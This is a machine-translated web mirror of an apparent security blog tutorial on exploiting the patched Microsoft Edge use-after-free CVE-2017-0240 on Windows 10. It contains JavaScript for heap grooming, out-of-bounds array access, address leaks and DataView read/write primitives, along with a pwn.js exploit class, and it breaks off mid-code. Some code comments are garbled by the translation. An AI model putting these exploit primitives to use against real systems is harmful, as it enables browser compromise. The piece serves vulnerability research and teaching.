<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🧗🏿 💻 🤚🏽 Windows 10上从CVE到RCE的Microsoft Edge 🎠 🤾🏻 🛌🏾</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="在本文的框架中，我们将充分详细地考虑为Microsoft Edge中的漏洞编写漏洞利用程序的过程，以及随后从沙盒退出的过程。 如果您有兴趣知道此过程的外观，欢迎光临！ 
 引言 


在蒙特利尔最新的Pwn2Own 2019中，在浏览器类别中，展示了一种用于入侵Microsoft Edge的漏洞。 ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Windows 10上从CVE到RCE的Microsoft Edge</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/455594/"><p><img src="https://habrastorage.org/webt/l6/oc/0a/l6oc0axkoxyoiss6dr77cytm1_e.jpeg" alt="前言"></p><br><p> 在本文的框架中，我们将充分详细地考虑为Microsoft Edge中的漏洞编写漏洞利用程序的过程，以及随后从沙盒退出的过程。 如果您有兴趣知道此过程的外观，欢迎光临！ </p><a name="habracut"></a><br><h2 id="vvedenie"> 引言 </h2><br><p>在蒙特利尔最新的<code>Pwn2Own 2019</code>中，在浏览器类别中，展示了一种用于入侵<code>Microsoft Edge</code>的漏洞。 为此使用了两个漏洞：渲染器中的<code>double free</code>和退出沙箱的逻辑漏洞。 这两个漏洞最近已关闭，并分配了相应的<code>CVE</code> ： <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><code>CVE-2019-0940</code></a>和<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><code>CVE-2019-0938</code></a> 。 您可以在博客中了解有关漏洞的更多信息： <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Pwn2Own 2019：Microsoft Edge Renderer Exploitation（CVE-2019-0940）。</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">第1部分</a>和<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Pwn2Own 2019：Microsoft Eedge Sandbox Escape（CVE-2019-0938）。</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">第二部分</a> 。 </p><br><p> 作为本文的一部分，我们要使用<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><code>CVE-2017-0240</code></a>和<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><code>CVE-2016-3309</code></a>以<code>Windows 10</code>上的<code>Microsoft Edge</code>为例，演示编写这种利用程序的过程以及为此需要多少时间和资源。 差异之一是，如果在<code>Pwn2Own</code>演示的漏洞利用逻辑漏洞退出沙箱，则在我们的方案中， <code>Windows 10</code>内核中的漏洞将用于退出沙箱。 正如<code>Microsoft</code>补丁所示，内核中的漏洞比沙盒实现中的漏洞要多得多。 结果，这样的漏洞链更有可能遇到，并且对于公司中的IS员工来说很有用。 </p><br><h2 id="ishodnye-dannye"> 源数据 </h2><br><p> 本文将介绍为<code>Microsoft Edge</code>浏览器编写1天漏洞利用的过程。  <code>CVE-2017-0240</code>将被运行。 操作的第一阶段将基于源代码中的资料[1]，我们将获得<code>arbitrary address read/write</code>原语，并且熟悉各种技术，这些技术在利用此类漏洞时可能会很有用。 接下来，我们将向您介绍<code>pwn.js</code>工具，该工具将帮助您基于任意读写来调用任意函数，还将考虑各种<code>mitigations</code>和绕过它们的方法。 在最后阶段，将利用Windows <code>CVE-2016-3309</code>内核漏洞来增加特权，绕过<code>AppContainer</code>限制并获得对受攻击计算机的完全控制。 </p><br><p> 将在带<code>Microsoft Windows 10 Pro 1703 (10.0.15063)</code>和<code>Microsoft Edge (40.15063.0.0)</code>浏览器<code>Microsoft Edge (40.15063.0.0)</code> 。 </p><br><h2 id="shag-1-poluchenie-arbitrary-address-readwrite-primitiva"> 步骤1.获得<code>arbitrary address read/write</code>原语 </h2><br><h3 id="opisanie-uyazvimosti-i-poluchenie-oob"> 漏洞描述和获取<code>OOB</code> </h3><br><p>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">音频缓冲区</a>对象的<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">copyFromChannel</a>方法中存在一个类型<code>use-after-free</code>漏洞。 </p><br><blockquote>  AudioBuffer是位于内存中的简短音频资产的接口，可以使用AudioContext.decodeAudioData（）方法从音频文件创建，也可以使用AudioContext.createBuffer（）方法从源数据创建。 放置在AudioBuffer中的音频数据可以在AudioBufferSourceNode中播放。 </blockquote><p>  <code>The Advanced Exploitation of 64-bit Edge Browser Use-After-Free Vulnerability on Windows 10</code>演示文稿提供了对该漏洞和补丁的详细分析。  <code>copyFromChannel</code>方法时，音频缓冲区通道的内容将复制到第一个参数指定的<code>destination</code>缓冲区。 该方法还接受通道号（ <code>channelNumber</code> ）和音频缓冲区中的偏移量（ <code>startInChannel</code> ），从该位置开始必须进行复制。 在将数据直接复制到<code>CDOMAudioBuffer::Var_copyFromChannel</code>函数中的<code>destination</code> <code>CDOMAudioBuffer::Var_copyFromChannel</code> ，将缓存<code>destination</code>缓冲区（缓冲区的地址和大小存储在堆栈上的本地函数变量中），并将<code>channelNumber</code>和<code>startInChannel</code>对象的值<code>startInChannel</code>为<code>Int</code>类型，为此调用转换后的对象的<code>valueOf</code>方法。 该漏洞是在类型转换时可以使用<code>valueOf</code>对象的重写方法释放缓存的缓冲区。 为了进行验证，我们使用以下代码： </p><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">// ,     var t2 = new Float32Array(0x20000); var ta = new Uint8Array(t2.buffer); for (i=0;i&lt;t2.length;i++) t2[i] = 0x66; var myctx = new AudioContext(); var audioBuf = myctx.createBuffer(1, 0x25, 22050); //   -   var t = audioBuf.getChannelData(0); var ta2 = new Uint8Array(t.buffer); for(i=0;i&lt;ta2.length;i++) ta2[i]=0x55; //     valueOf var obj = { valueOf: function () { //   var worker = new Worker('worker.js'); worker.postMessage(0, [t2.buffer]); worker.terminate(); worker = null; //    sleep(1000); return 0; } }; //   audioBuf.copyFromChannel(t2, obj, 0);</span></span></code> </pre> <br><p> 此代码使用<code>Web Workers</code>技术释放缓冲区。 创建一个空的<code>Worker</code> ，我们可以使用<code>postMessage</code>方法向他发送消息。 此方法的第二个可选<code>transfer</code>参数接受一个<code>Transferable</code>对象数组（ <code>ArrayBuffer</code> ， <code>MessagePost</code>或<code>ImageBitmap</code> ），该对象的权限将被转移给<code>Worker</code>并且该对象在当前上下文中将不再可用，因此可以将其删除。 此后，将进入<code>sleep</code> -暂时停止执行程序的功能（独立实现）。 这是必需的，以便垃圾收集系统（ <code>GC</code> ， <code>Garbage Collector</code> ）设法释放缓冲区，将权利转让给该缓冲区。 </p><br><blockquote>  Web Workers提供了一种在后台线程中运行脚本的简单方法。 辅助线程可以执行任务而不会干扰用户界面。 另外，他们可以使用XMLHttpRequest进行I / O（尽管responseXML和channel属性将始终为null）。 现有的Worker可以通过此代码指定的事件处理程序将JavaScript消息发送给创建者代码（反之亦然）。 </blockquote><p> 通过在调试器下的Edge中运行此代码，可以获得以下崩溃。 </p><br><p><img src="https://habrastorage.org/webt/iv/vx/zx/ivvxzxzff-qsxl8pxdqy6pmkbnq.png" alt="步骤01崩溃"></p><br><p> 结果，对<code>copyFromChannel</code>的调用尝试将音频缓冲区的内容复制到未分配的存储区中。 要利用此漏洞，必须在此内存区域中实现任何对象的分配。 在这种情况下，数组段是完美的。 </p><br><p>  <code>Chakra</code> （ <code>Edge</code>浏览器中使用的<code>JS</code>引擎）中的数组安排如下：数组对象具有固定的大小，指向数组对象的指针（对于<code>IntArray</code> ， <code>IntArray</code> ）存储在单独的内存区域中-段，对象中包含指向该对象的指针数组。 段头包含各种信息，包括段的大小，它对应于数组的大小。 数组的大小也存在于数组对象本身中。 从示意图上看，它看起来像这样： </p><br><p><img src="https://habrastorage.org/webt/kh/i1/wr/khi1wrtatqg2jq2bkhaz29b7u68.jpeg" alt="片断结构"></p><br><p> 因此，如果我们设法在先前释放的空间中选择数组段，则可以用音频缓冲区的内容覆盖数组段的头。 为此，我们在<code>sleep(1000);</code>之后添加以下几行来修改上面的代码<code>sleep(1000);</code>  ： </p><br><pre> <code class="javascript hljs">... <span class="hljs-comment"><span class="hljs-comment">/*        ,    .   arr        */</span></span> arr = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">Array</span></span>(<span class="hljs-number"><span class="hljs-number">128</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">for</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> i = <span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; arr.length; i++) { arr[i] = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">Array</span></span>(<span class="hljs-number"><span class="hljs-number">0x3ff0</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">for</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> j = <span class="hljs-number"><span class="hljs-number">0</span></span>; j &lt; arr[i].length; j++) arr[i][j] = <span class="hljs-number"><span class="hljs-number">0x30303030</span></span>; } ...</code> </pre> <br><p> 选择数组的大小以使数组段的大小占据整个堆段（最小的不可分割的堆内存，其大小为0x10000字节）。 运行此代码，将<code>memcpy</code>函数指定为断点（将会有许多<code>memcpy</code>调用，因此首先在<code>edgehtml!WebCore::AudioBufferData::copyBufferData</code>处停止是有意义的），在此发生崩溃。 我们得到以下结果： </p><br><p><img src="https://habrastorage.org/webt/nn/5u/yn/nn5uyncl0hvooyoar3lnua8cc8u.png" alt="步骤02"></p><br><p> 太好了！ 现在我们可以用我们自己的值覆盖数组段的标题。 在这种情况下，最有趣的值是数组的大小，我们可以在上面的屏幕截图中看到其偏移量。 更改音频缓冲区的内容，如下所示： </p><br><pre> <code class="javascript hljs">... var t = audioBuf.getChannelData(<span class="hljs-number"><span class="hljs-number">0</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ta2 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">Uint32Array</span></span>(t.buffer); ta2[<span class="hljs-number"><span class="hljs-number">0</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">1</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">2</span></span>] = <span class="hljs-number"><span class="hljs-number">0xffe0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">3</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">4</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">5</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">6</span></span>] = <span class="hljs-number"><span class="hljs-number">0xfba6</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">7</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">8</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">9</span></span>] = <span class="hljs-number"><span class="hljs-number">0x7fffffff</span></span> - <span class="hljs-number"><span class="hljs-number">2</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">10</span></span>] = <span class="hljs-number"><span class="hljs-number">0x7fffffff</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">11</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">12</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">13</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">14</span></span>] = <span class="hljs-number"><span class="hljs-number">0x40404040</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">15</span></span>] = <span class="hljs-number"><span class="hljs-number">0x50505050</span></span>; ...</code> </pre> <br><p> 注意<code>ta2[14]</code>和<code>ta2[15]</code> -它们已经不是引用段头，而是引用数组值本身。 这样，我们可以确定全局<code>arr</code>数组中所需的数组，如下所示： </p><br><pre> <code class="javascript hljs">... for(<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> i = <span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; arr.length; i++) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(arr[i][<span class="hljs-number"><span class="hljs-number">0</span></span>] == <span class="hljs-number"><span class="hljs-number">0x40404040</span></span> &amp;&amp; arr[i][<span class="hljs-number"><span class="hljs-number">1</span></span>] == <span class="hljs-number"><span class="hljs-number">0x50505050</span></span>) { alert(<span class="hljs-string"><span class="hljs-string">'Target array idx: '</span></span> + i); target_idx = i; target_arr = arr[i]; <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; } }</code> </pre> <br><p> 如果结果是找到一个数组，并且其前两个元素以某种方式更改，那么一切都很好。 现在，我们有了一个数组，其段大小大于实际大小。 剩余的阵列可以释放。 </p><br><p> 这里有必要记住，数组的大小存在于两个实体中：在数组对象中保持不变，而在数组段中增加数组。 事实证明，如果代码在<code>JIT</code>模式下执行并且已经过优化，则忽略数组对象中的大小。 这很容易实现，例如，如下所示： </p><br><pre> <code class="javascript hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">arr_get</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">idx</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> target_arr[idx]; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">arr_set</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">idx, val</span></span></span><span class="hljs-function">) </span></span>{ target_arr[idx] = val; } <span class="hljs-keyword"><span class="hljs-keyword">for</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> i = <span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; <span class="hljs-number"><span class="hljs-number">0x3ff0</span></span>; i++) { arr_set(i, arr_get(i)); }</code> </pre> <br><p> 之后，使用<code>arr_get</code>和<code>arr_set</code>您可以超越数组的边界（ <code>OOB</code> ， <code>out-of-bound</code> ）。 </p><br><h3 id="ispolzovanie-oob-dlya-polucheniya-primitiva-chteniya-i-zapisi-po-proizvolnomu-adresu"> 使用<code>OOB</code>获取读取和写入任意地址的原语 </h3><br><p> 在本节中，我们考虑一种允许您使用<code>OOB</code>读写任意地址的技术。 我们获得此结果的方法将类似于源代码[1]中使用的方法，但也将发生重大变化。 </p><br><p> 在使用的<code>Edge</code>版本中<code>Edge</code>堆的内存块是按顺序分配的，因此，当分配大量任何对象时，它们迟早会在数组段之后，我们可以超越它。 </p><br><p> 首先，它使我们能够读取指向对象方法虚拟表的指针（ <code>vftable</code> ），以便我们可以绕过进程地址空间（ <code>ASLR</code> ）的随机化。 但是访问哪些对象将帮助我们实现任意读写？ 几个<code>DataView</code>对象对此非常<code>DataView</code> 。 </p><br><blockquote>  DataView提供了一个低级接口，用于在二进制ArrayBuffer中读取和写入多个数字类型，而与平台字节顺序无关。 </blockquote><p>  <code>DataView</code>的内部结构包含一个指向缓冲区的指针。 例如，要读取和写入任意地址，我们可以构建两个<code>DataView</code>链（ <code>dv1</code>和<code>dv2</code> ），如下所示：作为<code>dv1</code>缓冲区<code>dv1</code>通过访问数组指定地址<code>dv2</code> 。 现在使用<code>dv1</code>我们可以更改<code>dv2</code>缓冲区的地址，因此可以实现任意读写。 可以用以下方式表示： </p><br><p><img src="https://habrastorage.org/webt/ch/9n/do/ch9ndofe4zamumfvihnmv6xtg-o.jpeg" alt="任意地址读/写"></p><br><p> 要使用此方法，您需要学习如何确定内存中对象的地址。 为此，存在以下技术：您需要创建一个新的<code>Array</code> ，使用<code>OOB</code>保存其<code>typeId</code>和<code>typeId</code> （结构的前两个64位字段），然后将地址感兴趣的对象分配给该数组的第一个元素。 然后，您必须还原先前保存的<code>typeId</code>和<code>typeId</code> 。 现在，可以通过引用数组的第一个和第二个元素来获得对象地址的初级和高级双字。 事实是，默认情况下，新数组为<code>IntArray</code> ，并且该数组的4字节值按原样存储在其段中。 在将对象分配给数组时，该数组将转换为<code>ObjectArray</code> ，其段用于存储对象的地址。 转换更改了<code>typeId</code>和<code>typeId</code> 。 因此，如果我们通过该数组的元素恢复原始值<code>typeId</code>和<code>typeId</code> ，则可以直接访问该段。 示意性描述的过程可以表示如下： </p><br><p><img src="https://habrastorage.org/webt/un/np/-z/unnp-zlvr6ql9m5_f9rmxrdwt20.jpeg" alt="指针泄漏"></p><br><p> 获取地址的函数将如下所示： </p><br><pre> <code class="javascript hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">addressOf</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">obj</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> hdr_backup = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">Array</span></span>(<span class="hljs-number"><span class="hljs-number">4</span></span>); <span class="hljs-comment"><span class="hljs-comment">//  vftable  typeId intarr_object for(var i = 0; i &lt; 4; i++) hdr_backup[i] = arr_get(intarr_idx + i); intarr_object[0] = obj; //  vftable  typeId intarr_object for(var i = 0; i &lt; 4; i++) arr_set(intarr_idx + i, hdr_backup[i]); //         return [intarr_object[0], intarr_object[1]]; }</span></span></code> </pre> <br><p> 一个尚待解决的问题仍然是必要对象的创建以及使用<code>OOB</code>进行搜索。 如前所述，当分配大量对象时，它们迟早会在数组段之后脱颖而出，我们可以超越它们。 要找到必要的对象，您只需要遍历数组外部的索引以寻找必要的对象。 因为 所有相同类型的对象都位于堆的一个段中，您可以优化搜索并以<code>0x10000</code>增量遍历堆的各个段，并仅检查堆每个段开头的前几个值。 为了识别对象，可以为某些参数为其设置唯一值（例如，对于<code>DataView</code>可以为<code>byteOffset</code> ），或者使用对象结构中的已知常量（例如，在使用的<code>Edge</code>中的<code>IntArray</code>版本中，值<code>0x10005</code>始终位于<code>0x18</code> ）。 </p><br><p> 通过结合以上所有技术，您可以对任意地址进行读写。 下面是读取<code>DataView</code>内存对象的屏幕截图。 </p><br><p><img src="https://habrastorage.org/webt/fe/i5/o3/fei5o3k0zh3pogdmb5diifeick8.png" alt="内存泄漏"></p><br><h2 id="shag-2-vypolnenie-proizvolnyh-funkciy-api"> 步骤2.执行任意API函数 </h2><br><p> 在此阶段，我们能够在显示<code>Edge</code>内容的过程中读写任意地址。 考虑应该干扰应用程序进一步操作的主要技术及其解决方法。 我们已经写了几篇简短的文章系列，介绍了<code>  app specific security mitigation</code> （ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">第1部分，简介</a> ， <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">第2部分，Internet Explorer和Edge</a> ， <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">第3部分，Google Chrome</a> ），但是请记住，开发人员不会停滞不前并向其产品添加新工具保护。 </p><br><h3 id="randomizaciya-adresnogo-prostranstva-aslr"> 地址空间随机化（ <code>ASLR</code> ） </h3><br><blockquote>  ASLR（英语地址空间布局随机化）是一种在操作系统中使用的技术，它会随机更改进程地址空间中重要数据结构的位置，即：可执行文件映像，已加载的库，堆和堆栈。 </blockquote><p> 上面，我们学会了读取虚拟类表的地址，使用它们，我们可以轻松地计算<code>Chakra.dll</code>模块的基地址，因此<code>ASLR</code>不会出现进一步操作的问题。 </p><br><h3 id="data-execution-protection-dep-nx"> 数据执行保护（ <code>DEP</code> ， <code>NX</code> ） </h3><br><blockquote> 数据执行保护（DEP）是Linux，Mac OS X，Android和Windows内置的一项安全功能，可防止应用程序从标记为“仅数据”的内存区域执行代码。 它将防止某些攻击，例如，使用缓冲区溢出将代码保存在此类区域中。 </blockquote><p> 解决此问题的一种方法是使用<code>ROP</code>链调用<code>VirtualAlloc</code> 。 但是在<code>Edge</code>的情况下，由于使用<code>ACG</code> <code>Edge</code>此方法将不起作用（请参见下文）。 </p><br><h3 id="control-flow-guard-cfg"> 控制流防护（ <code>CFG</code> ） </h3><br><blockquote>  <code>CFG</code>是一种保护机制，旨在使利用用户和内核模式应用程序中的二进制漏洞的过程变得复杂。 该机制的工作在于验证间接调用，从而防止攻击者拦截执行线程（例如，通过覆盖虚拟函数表）。 </blockquote><p> 该技术仅控制间接调用，例如，来自对象函数虚拟表的方法调用。 堆栈上的返回地址不受控制，可用于构建<code>ROP</code>链。  <code>Intel</code>新技术： <code>Control-flow Enforcement Technology</code> （ <code>CET</code> ）可能会阻碍<code>ROP/JOP/COP</code>链的未来使用。 该技术包括两个部分： </p><br><ol><li>  <code>Shadow Stack</code> （影子堆栈）-用于控制返回地址并防止<code>ROP</code>链； </li><li>  <code>Indirect Branch Tracking</code>是一种防范<code>JOP/COP</code>链的方法。 这是一条新的<code>ENDBRANCH</code>指令，它标记了<code>call</code>和<code>jmp</code>指令的所有有效转换地址。 </li></ol><br><h3 id="arbitrary-code-guard-acg"> 任意代码保护（ <code>ACG</code> ） </h3><br><blockquote>  <code>ACG</code>是一种防止动态代码生成（禁止使用<code>VirtaulAlloc</code>分配内存的<code>rwx</code>区域）及其修改（无法将现有内存区域<code>VirtaulAlloc</code>为可执行文件）的技术。 </blockquote><p> 像<code>CFG</code>一样，这种保护不会阻止<code>ROP</code>链的使用。 </p><br><h3 id="appcontainer-isolation">  AppContainer隔离 </h3><br><blockquote>  AppContainer是一项Microsoft技术，可让您通过在沙盒环境中运行该进程来隔离该进程。 该技术将进程的访问限制在凭据，设备，文件系统，网络，其他进程和窗口中，旨在最大程度地降低恶意软件的能力，该恶意软件具有在进程中执行任意代码的能力。 </blockquote><p> 这种保护极大地使操作过程复杂化。 因此，我们无法调用第三方可执行文件或访问内存或磁盘中的敏感用户信息。 但是，可以通过在AppContainer沙箱的实现中使用漏洞或通过利用OS内核中的漏洞来增加特权来克服这种保护。 </p><br><p> 值得注意的是， <code>Microsoft</code>有单独的<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">奖励计划</a> ，用于规避<code>security mitigation</code>技术的技术。 该程序表明重用可执行代码（构建<code>ROP</code>链是该技术的一种变体）不属于该程序的范围，因为 是一个架构问题。 </p><br><h3 id="ispolzovanie-pwnjs"> 使用pwn.js </h3><br><p> 从对所有安全技术的分析来看，为了能够执行任意代码，您需要绕过<code>AppContainer</code>沙箱。 在本文中，我们描述了一种使用<code>Windows</code>内核中的漏洞的方法。 在这种情况下，我们只能使用<code>JS</code>代码和<code>ROP</code>链。 仅使用<code>ROP</code>链为内核编写漏洞利用程序可能非常困难。 为了简化此任务，您可以找到一组小工具，用它们我们可以调用必要的<code>WinAPI</code>方法。 幸运的是，这已经在<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><code>pwn.js</code></a>库中实现了。 使用它，仅描述了用于任意读写的<code>write</code>功能，您可以获得一个便捷的<code>API</code>用于查找必要的<code>WinAPI</code>函数并对其进行调用。  <code>pwn.js</code>还提供了用于处理64位值和指针的便捷工具，以及用于处理结构的工具。 </p><br><p> 考虑一个简单的例子。 在上一步中，我们获得了两个相关的<code>DataView</code>链。 要准备利用，必须创建以下类： </p><br><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> Exploit = (<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ChakraExploit = pwnjs.ChakraExploit; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> Integer = pwnjs.Integer; <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Exploit</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ ChakraExploit.call(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>); ... <span class="hljs-comment"><span class="hljs-comment">//  arbitrary address read/write    ... // DataView,         this.dv = ...; // DataView,     this.dv this.dv_offset = ...; //    Chakra.dll, ,     var vtable = ...; this.initChakra(vtable); } Exploit.prototype = Object.create(ChakraExploit.prototype); Exploit.prototype.constructor = Exploit; Exploit.prototype.set_dv_address = function(lo, hi) { this.dv_offset.setInt32(0x38, lo, true); this.dv_offset.setInt32(0x3c, hi, true); } Exploit.prototype.read = function (address, size) { this.set_dv_address(address.low, address.high); switch (size) { case 8: return new Integer(this.dv.getInt8(0, true), 0, true); case 16: return new Integer(this.dv.getInt16(0, true), 0, true); case 32: return new Integer(this.dv.getInt32(0, true), 0, true); case 64: return new Integer(this.dv.getInt32(0, true), this.dv.getInt32(4, true), true); } } Exploit.prototype.write = function (address, value, size) { this.set_dv_address(address.low, address.high); switch (size) { case 8: this.dv.setInt8(0, value.low, true); break; case 16: this.dv.setInt16(0, value.low, true); break; case 32: this.dv.setInt32(0, value.low, true); break; case 64: this.dv.setInt32(0, value.low, true); this.dv.setInt32(4, value.high, true); break; } } return Exploit; })();</span></span></code> </pre> <br><p>     ,      <code>MessageBoxA</code> : </p><br><pre> <code class="javascript hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">run</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">with</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Exploit()) { <span class="hljs-comment"><span class="hljs-comment">//alert('Chakra: 